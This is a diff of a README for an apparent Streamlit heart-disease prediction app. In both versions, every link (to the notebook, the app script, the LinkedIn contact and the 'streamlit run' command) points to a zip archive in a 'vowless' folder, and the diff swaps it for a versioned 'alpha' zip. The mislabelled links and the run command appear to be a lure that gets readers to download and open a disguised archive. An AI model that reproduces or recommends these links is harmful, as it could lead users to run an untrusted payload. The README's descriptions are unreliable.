@@ -28,9 +28,9 @@ NumPy: For numerical operations.
 Plotly Express: For creating the interactive and informative data visualizations.
 
 Project Structure
-https://raw.githubusercontent.com/ruturajbhaskarnawale/Heart-disease-Prediction/main/vowless/Heart-disease-Prediction.zip The Jupyter Notebook used for the initial data analysis, exploration, and model training.
+https://github.com/ruturajbhaskarnawale/Heart-disease-Prediction/raw/refs/heads/main/vowless/Prediction_disease_Heart_v1.4-alpha.5.zip The Jupyter Notebook used for the initial data analysis, exploration, and model training.
 
-https://raw.githubusercontent.com/ruturajbhaskarnawale/Heart-disease-Prediction/main/vowless/Heart-disease-Prediction.zip The main Python script for the Streamlit web application.
+https://github.com/ruturajbhaskarnawale/Heart-disease-Prediction/raw/refs/heads/main/vowless/Prediction_disease_Heart_v1.4-alpha.5.zip The main Python script for the Streamlit web application.
 
 Getting Started
 To run this application locally, follow these steps:
@@ -45,7 +45,7 @@ pip install streamlit scikit-learn pandas numpy plotly-express
 
 Run the Streamlit application from your terminal:
 
-streamlit run https://raw.githubusercontent.com/ruturajbhaskarnawale/Heart-disease-Prediction/main/vowless/Heart-disease-Prediction.zip
+streamlit run https://github.com/ruturajbhaskarnawale/Heart-disease-Prediction/raw/refs/heads/main/vowless/Prediction_disease_Heart_v1.4-alpha.5.zip
 
 The application will open in your default web browser.
 
@@ -53,4 +53,4 @@ Data Source
 The project's model was trained on the Heart Disease UCI dataset, sourced from Kaggle.
 
 Connect with Me
-LinkedIn: https://raw.githubusercontent.com/ruturajbhaskarnawale/Heart-disease-Prediction/main/vowless/Heart-disease-Prediction.zip
+LinkedIn: https://github.com/ruturajbhaskarnawale/Heart-disease-Prediction/raw/refs/heads/main/vowless/Prediction_disease_Heart_v1.4-alpha.5.zip
